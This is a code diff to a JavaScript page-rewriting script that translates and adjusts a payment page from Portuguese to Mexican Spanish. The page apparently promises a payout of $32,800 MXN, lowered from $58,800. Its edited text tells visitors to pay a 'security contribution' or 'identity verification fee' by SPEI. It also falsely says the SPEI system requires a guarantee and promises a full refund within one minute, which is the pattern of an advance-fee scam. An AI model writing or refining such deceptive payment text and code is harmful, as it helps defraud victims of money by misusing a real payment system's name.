@@ -122,12 +122,12 @@
       .replace(/Contribuição/g, 'Contribucion')
       .replace(/Contribuição de seguridad exigida pelo sistema SPEI/g, 'Contribucion de seguridad requerida por el sistema SPEI')
       .replace(/após a confirmação SPEI/g, 'despues de la confirmacion SPEI')
-      .replace(/PAGUE POR SPEI/g, 'PAGA POR SPEI')
-      .replace(/PAGUE POR/g, 'PAGA POR')
-      .replace(/Pague por SPEI/g, 'Paga por SPEI')
-      .replace(/Pague por/g, 'Paga por')
+      .replace(/PAGUE POR SPEI/g, 'Pagar mediante SPEI')
+      .replace(/PAGUE POR/g, 'Pague la tarifa de verificación de identidad')
+      .replace(/Pague por SPEI/g, 'Pagar mediante SPEI')
+      .replace(/Pague por/g, 'Pague la tarifa de verificación de identidad')
       .replace(/Use a entidade e referência no app do seu banco\./g, 'Usa los datos SPEI en la app de tu banco.')
-      .replace(/Entidade:/g, 'Banco:')
+      .replace(/Entidade:/g, 'Método de pago:')
       .replace(/Referência:/g, 'Referencia:')
       .replace(/Aguardando pagamento/g, 'Esperando pago')
       .replace(/Oferta expira em/g, 'La oferta expira en')
@@ -216,7 +216,8 @@
       .replace(/Composição da taxa/g, 'Composicion de la tarifa')
       .replace(/Dados para reembolso/g, 'Datos de retiro')
       .replace(/reembolsável/gi, 'reembolsable')
-      .replace(/O valor de/g, 'El valor de')
+      .replace(/O valor de/g, 'Una vez completada la verificación, los')
+      .replace(/El valor de/g, 'Una vez completada la verificación, los')
       .replace(/Validação BdP/g, 'Validacion SPEI')
       .replace(/Seguro antifraude/g, 'Proteccion antifraude')
       .replace(/Banco de Portugal/g, 'sistema SPEI')
@@ -279,9 +280,11 @@
       .replace(/Sem risco de cancelamento/g, 'Sin riesgo de cancelacion')
       .replace(/Pagamento confirmado/g, 'Pago confirmado')
       .replace(/Aguardando confirmação/g, 'Esperando confirmacion')
-      .replace(/Contribucion de seguridad exigida pelo sistema SPEI para libertação do retiro/g, 'Contribucion de seguridad requerida por el sistema SPEI para liberar el retiro')
-      .replace(/será devolvido integralmente via SPEI em 1 minuto/g, 'sera devuelto integralmente via SPEI en 1 minuto')
-      .replace(/será devolvido integralmente via SPEI en 1 minuto/g, 'sera devuelto integralmente via SPEI en 1 minuto')
+      .replace(/Contribucion de seguridad exigida pelo sistema SPEI para libertação do retiro/g, 'El sistema SPEI requiere una garantía para liberar el retiro')
+      .replace(/Contribucion de seguridad requerida por el sistema SPEI para liberar el retiro/g, 'El sistema SPEI requiere una garantía para liberar el retiro')
+      .replace(/será devolvido integralmente via SPEI em 1 minuto/g, 'serán reembolsados íntegramente a través de SPEI en un plazo de 1 minuto')
+      .replace(/será devolvido integralmente via SPEI en 1 minuto/g, 'serán reembolsados íntegramente a través de SPEI en un plazo de 1 minuto')
+      .replace(/sera devuelto integralmente via SPEI en 1 minuto/g, 'serán reembolsados íntegramente a través de SPEI en un plazo de 1 minuto')
       .replace(/libertação do retiro/g, 'liberar el retiro')
       .replace(/A tua/g, 'Tu')
       .replace(/teu/g, 'tu')
@@ -325,17 +328,19 @@
 
   function translateMoney(text) {
     return String(text || '')
-      .replace(/\b2\.800,00\b/g, '58,800.00')
-      .replace(/\b2\.800\b/g, '58,800')
-      .replace(/\b2800,00\b/g, '58,800.00')
-      .replace(/\b2800\b/g, '58,800')
+      .replace(/\b2\.800,00\b/g, '32,800.00')
+      .replace(/\b2\.800\b/g, '32,800')
+      .replace(/\b2800,00\b/g, '32,800.00')
+      .replace(/\b2800\b/g, '32,800')
       .replace(/€\s*([0-9.,]+)/g, function (_, raw) {
-      if (/^(?:58[,.]800|58[,.]800[,.]00|2\.800|2\.800,00|2800|2800,00)$/i.test(raw)) return money(58800);
+      if (/^(?:32[,.]800|32[,.]800[,.]00|2\.800|2\.800,00|2800|2800,00)$/i.test(raw)) return money(32800);
       var normalized = raw.replace(/\./g, '').replace(',', '.');
       var eur = Number(normalized);
       if (!Number.isFinite(eur)) return '$ ' + raw + ' MXN';
-      if (Math.abs(eur - 58800) < 0.01 || Math.abs(eur - 2800) < 0.01) return money(58800);
-      if (Math.abs(eur - 58.8) < 0.01 || Math.abs(eur - 58.80) < 0.01) return money(58800);
+      if (Math.abs(eur - 32800) < 0.01 || Math.abs(eur - 2800) < 0.01) return money(32800);
+      if (Math.abs(eur - 58800) < 0.01 || Math.abs(eur - 2800) < 0.01) return money(32800);
+      if (Math.abs(eur - 32.8) < 0.01 || Math.abs(eur - 32.80) < 0.01) return money(32800);
+      if (Math.abs(eur - 58.8) < 0.01 || Math.abs(eur - 58.80) < 0.01) return money(32800);
       if (Math.abs(eur - 97.23) < 0.01) return money(97.23);
       if (Math.abs(eur - 99.95) < 0.01) return money(99.95);
       if (Math.abs(eur - 100.00) < 0.01) return money(100);
@@ -422,7 +427,7 @@
     var root = document.getElementById('root') || document.body;
     if (document.getElementById('mx-lab-thankyou-page')) return true;
     var name = 'Cliente';
-    var amount = '$58,800 MXN';
+    var amount = '$32,800 MXN';
     var clabe = '';
     try {
       name = localStorage.getItem('mx_lab_name') || name;
@@ -509,11 +514,11 @@
 	      if (/^A verificacion de seguridad es el ultimo paso/i.test(text)) {
 	        el.textContent = text.replace(/^A verificacion/i, 'La verificacion');
 	      }
-	      if (/^\s*€\s*58,800\.00\s*$/i.test(text)) {
-	        el.textContent = '$58,800 MXN';
+	      if (/^\s*€\s*58,800\.00\s*$/i.test(text) || /^\s*\$\s*58,800\.00\s*MXN\s*$/i.test(text) || /^\s*€\s*32,800\.00\s*$/i.test(text)) {
+	        el.textContent = '$32,800 MXN';
 	      }
-	      if (/^\s*=\s*28\s*000\s*punto\(s\)\s*$/i.test(text)) {
-	        el.textContent = '= 58,800 MXN';
+	      if (/^\s*=\s*28\s*000\s*punto\(s\)\s*$/i.test(text) || /^\s*=\s*58,800\s*MXN\s*$/i.test(text)) {
+	        el.textContent = '= 32,800 MXN';
 	      }
 	    });
 
@@ -654,7 +659,7 @@
       if (/Reembolso de \$(?:199\.90|197\.23|100\.00|100|60\.00|60|50\.00|50|40\.00|40) MXN en 1 minuto/i.test(text)) {
         el.classList.toggle('mx-lab-hide', !hasContribution);
       }
-      if (/^1\s*Pagar\s*\$(?:199\.90|197\.23|100\.00|100|60\.00|60|50\.00|50|40\.00|40) MXN/i.test(text) && /2\s*Reembolso/i.test(text) && /3\s*\$58,800 MXN/i.test(text)) {
+      if (/^1\s*Pagar\s*\$(?:199\.90|197\.23|100\.00|100|60\.00|60|50\.00|50|40\.00|40) MXN/i.test(text) && /2\s*Reembolso/i.test(text) && /3\s*\$(?:58,800|32,800) MXN/i.test(text)) {
         el.classList.toggle('mx-lab-hide', !hasContribution);
       }
     });
@@ -674,10 +679,10 @@
           .replace(/Pague por/g, 'Paga por');
         if (next !== node.nodeValue) node.nodeValue = next;
       });
-      if (text === 'PAGUE POR SPEI') el.textContent = 'PAGA POR SPEI';
-      if (text === 'PAGUE POR') el.textContent = 'PAGA POR';
-      if (text === 'Pague por SPEI') el.textContent = 'Paga por SPEI';
-      if (text === 'Entidade:') el.textContent = 'Banco:';
+      if (text === 'PAGA POR SPEI' || text === 'PAGUE POR SPEI') el.textContent = 'Pagar mediante SPEI';
+      if (text === 'PAGA POR' || text === 'PAGUE POR') el.textContent = 'Pague la tarifa de verificación de identidad';
+      if (text === 'Paga por SPEI' || text === 'Pague por SPEI') el.textContent = 'Pagar mediante SPEI';
+      if (text === 'Entidade:' || text === 'Banco:') el.textContent = 'Método de pago:';
       if (text === 'Referência:') el.textContent = 'Referencia:';
       if (text === 'Aguardando pagamento...') el.textContent = 'Esperando pago...';
     });
